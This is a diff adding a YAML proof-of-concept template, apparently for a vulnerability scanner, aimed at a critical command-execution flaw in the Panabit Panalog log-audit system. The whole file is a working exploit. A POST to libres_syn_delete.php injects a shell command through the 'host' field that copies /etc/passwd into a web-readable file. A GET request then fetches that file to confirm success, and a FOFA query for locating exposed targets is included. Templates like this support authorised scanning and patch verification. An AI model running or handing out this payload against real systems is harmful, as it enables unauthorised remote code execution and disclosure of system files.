@@ -1,0 +1,29 @@
+id: poc-yaml-panalog-libres-syn-delete-php-rce
+info:
+  name: Panalog 日志审计系统 libres_syn_delete.php 命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: Panabit Panalog
+  fofa: app="Panabit-Panalog"
+variables:
+  t1: random_str(5)
+requests:
+- method: POST
+  path: /content-apply/libres_syn_delete.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: token=1&id=2&host=|cat /etc/passwd >{{.t1}}.txt
+  expression: status_code == 200 && contains(body,`{"yn":"yes","str":"OK"}`)
+- method: GET
+  path: /content-apply/{{.t1}}.txt
+  expression: 'status_code == 200
+
+    && contains(body,"root:")
+
+    && contains(body,"/bin")
+
+    && !contains(body,"<")
+
+    '
+transport: http
